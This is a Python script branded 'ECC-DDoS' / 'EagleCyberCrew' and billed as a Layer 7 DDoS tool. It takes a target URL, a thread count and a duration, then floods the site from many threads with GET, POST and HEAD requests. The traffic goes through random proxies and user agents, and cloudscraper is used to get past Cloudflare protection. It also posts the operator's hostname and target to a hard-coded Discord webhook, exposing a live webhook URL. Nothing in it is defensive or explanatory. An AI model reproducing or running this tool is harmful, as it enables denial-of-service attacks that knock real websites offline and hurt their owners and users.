try:
    import os
    from os import system, name
    import httpx
    from httpx import AsyncClient, Headers
    import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random, socket
    from discord_webhook import DiscordWebhook, DiscordEmbed
    from urllib.parse import urlparse
    from requests.cookies import RequestsCookieJar
    from sys import stdout
except:
    print("1)pip")
    print("2)pip3")
    typ = input("Choose 1 or 2 : ")
    if typ == '1':
        os.system("pip install httpx")
    else:
        os.system("pip3 install httpx")

hst = socket.gethostname()


def countdown():
    stdout.write("Bypassing CloudFlare")
    
############################################################################################################################################
with open('ua.txt', 'r') as f1:

    useragents = f1.read().splitlines()
    
headers = {
        'User-Agent' : random.choice(useragents) + "\r\n" 
}

############################################################################################################################################################################################################################
def title():
    print \
("""
\033[0m╭━━━┳━━━┳━━━┳╮╱╱╭━━━╮\033[96m╭━━━┳╮╱╱╭┳━━╮╭━━━┳━━━╮
\033[0m┃╭━━┫╭━╮┃╭━╮┃┃╱╱┃╭━━╯\033[96m┃╭━╮┃╰╮╭╯┃╭╮┃┃╭━━┫╭━╮┃
\033[0m┃╰━━┫┃╱┃┃┃╱╰┫┃╱╱┃╰━━╮\033[96m┃┃╱╰┻╮╰╯╭┫╰╯╰┫╰━━┫╰━╯┃
\033[0m┃╭━━┫╰━╯┃┃╭━┫┃╱╭┫╭━━╯\033[96m┃┃╱╭╮╰╮╭╯┃╭━╮┃╭━━┫╭╮╭╯
\033[0m┃╰━━┫╭━╮┃╰┻━┃╰━╯┃╰━━╮\033[96m┃╰━╯┃╱┃┃╱┃╰━╯┃╰━━┫┃┃╰╮
\033[0m╰━━━┻╯╱╰┻━━━┻━━━┻━━━╯\033[96m╰━━━╯╱╰╯╱╰━━━┻━━━┻╯╰━╯\033[0m 
              DDoS Tool Layer7                                        
""")
##############################################################################################
def get_info_l7():
    stdout.write("Url/Target =  ")
    target = input()
    stdout.write("THREADS (500)= ")
    thread = input()
    stdout.write("TIME(s) = ")
    t = input() 
    webhook =              DiscordWebhook(url="https://discord.com/api/webhooks/1098901616964419728/f6liWiU36mUC8lvRRv8ajqpdTzanv07Bmr2oP_yao42_s7QX4QC0S68pKtCABjZ7eD3L")
    embed = DiscordEmbed(title=" :satellite: ECC-DDoS Attack Log :satellite:", color=0x2ecc71)

    embed.set_timestamp()
    embed.set_footer(text="©️ ECC-DDoS")
    embed.add_embed_field(name=f'Infomartion', value=f'User {hst} is Now Attacking {target}')

    webhook.add_embed(embed)
    response = webhook.execute()
    return target, thread, t
	
def Launch(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=Attack, args=(url, until, scraper))
            thd.start()
            print(f"[EagleCyberCrew] Mematuk [{target}]")
        except:
            pass

def Attack(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            s = requests.Session()
            ff = str(random.choice(open('proxy.txt').readlines()))
            s.proxies['http'] = 'http://' + ff
            s.proxies['https'] = 'https://' + ff
            scraper.get(url, timeout=5)
            scraper.post(url, timeout=5)
            scraper.head(url, timeout=5)
            a = s.get(url, headers=headers)
            print(f'get...    {a}')
            aa = s.post(url, headers=headers, )
            print(aa) 
            print(f'post...     {aa}')
            requests.head(url, headers=headers)
            print("head...")            
        except:
            pass
title()			
command = ("s")         
if command == "s" or command == "s":
        target, thread, t = get_info_l7()
        Launch(target, thread, t)
